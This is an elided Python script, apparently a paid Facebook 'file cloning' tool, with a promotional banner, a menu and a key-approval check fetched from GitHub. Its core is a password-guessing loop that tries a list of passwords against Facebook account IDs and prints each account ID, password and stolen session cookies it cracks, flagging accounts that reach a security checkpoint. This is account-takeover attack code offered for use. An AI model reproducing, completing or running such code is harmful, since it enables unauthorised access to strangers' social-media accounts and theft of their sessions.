...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'RATUL' and password == 'ROHAN':
...
os.system('xdg-open https://www.facebook.com/rdx.rafiujjaman')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╠══[Facebook                 • Ratul King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mRatul-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 01820407364 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 3.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	RATULj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	RATULj('\033[0;97m===============================================')
	RATUL= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if RATUL in ['m']:
		public()
	elif RATUL in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+01820407364')
	elif RATUL in ['0']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Ratul-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Ratul-King/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Ratul+key1)
